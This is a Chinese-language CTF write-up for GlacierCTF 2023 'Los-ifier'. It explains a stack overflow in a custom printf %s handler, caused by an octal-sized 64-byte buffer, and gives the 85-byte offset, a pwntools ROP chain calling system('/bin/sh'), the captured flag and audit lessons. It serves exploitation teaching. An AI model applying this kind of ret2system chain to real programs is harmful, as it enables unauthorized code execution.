# GlacierCTF2023 - Los-ifier

## 题目简述

程序用 `register_printf_specifier` 重定义 `%s`。`printf("-> %s\n", input)` 不再走 libc 的普通字符串输出，而是进入自定义 handler：先在栈缓冲区写入 `Los`，再由 `loscopy` 复制用户输入直到换行。二进制静态链接、无 PIE、NX 开启；易受攻击的 handler 没有栈 canary。

## 解题过程

源码声明 `char buf[0100]`，其中 `0100` 是八进制，即只有 64 字节。复制循环没有目标长度检查：

```c
void loscopy(char *dst, char *src, char stop) {
    while (*src != stop) {
        *(dst++) = *(src++);
    }
}
```

用 8 字节 cyclic pattern 定位，handler 返回地址对应输入偏移 85。栈中实际到返回地址的距离是 88 字节，但 handler 预先写入的 `Los` 占了 3 字节，所以攻击者只需发送 85 字节 padding。

源码特意保留了 `system` 和 `/bin/sh`，静态、无 PIE 二进制使二者地址固定。构造 `ret; pop rdi; "/bin/sh"; system`，额外的单独 `ret` 用于满足 x86-64 调用前的 16 字节栈对齐：

```python
exe = context.binary = ELF("./chall")
rop = ROP(exe)
rop.raw(b"A" * 85)
rop.raw(rop.ret.address)
rop.call("system", [next(exe.search(b"/bin/sh\x00"))])

io.sendline(rop.chain())
```

弹出 shell 后读取：

```text
gctf{l0ssp34k_UwU_L0v3U}
```

仓库没有官方正文，以上机制由源码和官方 solver 重建；[参赛者的完整独立复现](https://loevland.github.io/posts/glacier23/)也验证了八进制缓冲区、85 字节偏移、`fwrite` 过长输入干扰和 MOVAPS 栈对齐问题，关键结论已全部写入正文。

## 方法总结

自定义 printf handler 扩大了常规格式化调用的攻击面。审计时要追踪注册后的真实分派目标，并注意 C 的八进制整数字面量。全局 checksec 显示“存在 canary”不代表每个函数都受保护，最终仍应检查具体漏洞函数的序言和栈布局。
